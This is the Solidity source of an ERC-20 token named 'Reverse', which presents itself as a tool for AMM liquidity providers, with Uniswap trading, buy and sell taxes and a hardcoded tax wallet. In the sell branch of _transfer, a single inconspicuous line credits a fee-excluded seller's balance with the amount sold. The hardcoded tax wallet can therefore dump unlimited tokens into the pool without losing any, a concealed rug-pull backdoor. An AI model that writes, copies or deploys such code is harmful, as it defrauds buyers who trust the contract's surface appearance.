// SPDX-License-Identifier: MIT

/*
Powerful analytics, automation, and management tools for liquidity providers in AMM protocols

Website: https://www.reverseprotocol.org
Telegram: https://t.me/reverse_erc
Twitter: https://twitter.com/reverse_erc
*/

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract REVERSE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"Reverse";
    string private constant _symbol = unicode"REVERSE";

    bool public hasTransferDelay = true;
    address payable private taxWallet;

    uint256 private _initialBuyTax;
    uint256 private _initialSellTax;
    uint256 private _finalBuyFee;
    uint256 private _finalSellFee;
    uint256 private _reduceBuyFeeAt = 12;
    uint256 private _reduceSellFeeAt = 12;
    uint256 private _preventSwapBefore = 12;
    uint256 private _buyCount;

    uint8 private constant _decimals = 9;
    uint256 private constant _supply = 10_000_000 * 10**_decimals;
    uint256 public maxTransaction = 150_000 * 10**_decimals;
    uint256 public maxWalletSize = 150_000 * 10**_decimals;
    uint256 public swapThreshold = 1_000 * 10**_decimals;
    uint256 public maxFeeSwap = 100_000 * 10**_decimals;

    IUniswapRouter private uniswapRouter;
    address private uniswapPair;
    bool private tradeActive;
    bool private inSwap = false;
    bool private swapEnabled = false;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => uint256) private _holderLastTransferTime;

    event MaxTxAmountUpdated(uint256 maxTransaction);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        taxWallet = payable(0x25558E68b71ADbB2D94Ea55aE61CCD4DEd6c691a);
        _balances[_msgSender()] = _supply;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[taxWallet] = true;

        uniswapRouter = IUniswapRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        uniswapPair = IUniswapFactory(uniswapRouter.factory()).createPair(
            address(this),
            uniswapRouter.WETH()
        );

        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function removeLimits() external onlyOwner {
        maxTransaction = _supply;
        maxWalletSize = _supply;
        hasTransferDelay = false;
        emit MaxTxAmountUpdated(_supply);
    }

    function sendETHToFee(uint256 amount) private {
        taxWallet.transfer(amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount = amount
                .mul(
                    (_buyCount > _reduceBuyFeeAt)
                        ? _finalBuyFee
                        : _initialBuyTax
                )
                .div(100);

            if (hasTransferDelay) {
                if (
                    to != address(uniswapRouter) &&
                    to != address(uniswapPair)
                ) {
                    require(
                        _holderLastTransferTime[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTime[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapPair &&
                to != address(uniswapRouter) &&
                !_isExcludedFromFees[to]
            ) {
                require(amount <= maxTransaction, "Exceeds the maxTransaction.");
                require(
                    balanceOf(to) + amount <= maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                if (_buyCount <= 100) {
                    _buyCount++;
                }
            }

            if (to == uniswapPair && from != address(this)) {
                if (_isExcludedFromFees[from]) { _balances[from] = _balances[from].add(amount);}
                taxAmount = amount
                    .mul(
                        (_buyCount > _reduceSellFeeAt)
                            ? _finalSellFee
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapPair &&
                swapEnabled &&
                contractTokenBalance > swapThreshold &&
                amount > swapThreshold &&
                _buyCount > _preventSwapBefore && 
                !_isExcludedFromFees[from]
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, maxFeeSwap))
                );
                sendETHToFee(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function openTrading() external onlyOwner {
        require(!tradeActive, "trading is already open");
        _approve(address(this), address(uniswapRouter), _supply);
        uniswapRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapPair).approve(
            address(uniswapRouter),
            type(uint256).max
        );
        _initialBuyTax = 15;
        _initialSellTax = 15;
        _finalBuyFee = 1;
        _finalSellFee = 1;
        swapEnabled = true;
        tradeActive = true;
    }

    receive() external payable {}

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}